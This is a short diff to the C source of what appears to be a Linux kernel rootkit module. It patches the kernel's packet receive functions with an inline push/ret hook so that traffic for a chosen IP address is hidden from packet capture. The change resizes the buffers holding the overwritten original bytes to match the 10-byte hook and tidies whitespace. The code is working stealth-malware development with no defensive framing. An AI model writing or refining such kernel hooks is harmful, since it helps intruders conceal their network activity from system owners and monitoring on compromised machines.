@@ -36,9 +36,9 @@ char hook[10] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc3 };
 unsigned long *target = (unsigned long *) (hook + 1);
 
 /* code of the original functions that has been overwritten by us */
-char original_packet_rcv[6];
-char original_tpacket_rcv[6];
-char original_packet_rcv_spkt[6];
+char original_packet_rcv[10];
+char original_tpacket_rcv[10];
+char original_packet_rcv_spkt[10];
 
 /* check if we need to hide this particular packet */
 int
@@ -232,7 +232,7 @@ load_packet_hiding (char *ipv4_addr)
 
 	/* convert ip string to an int array */	
 	in4_pton(ipv4_addr, -1, dst, -1, NULL);
-	hidden_ip = *(unsigned int *)dst; 
+	hidden_ip = *(unsigned int *)dst;
 
 	/* do the initial hook of all three functions */
 	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
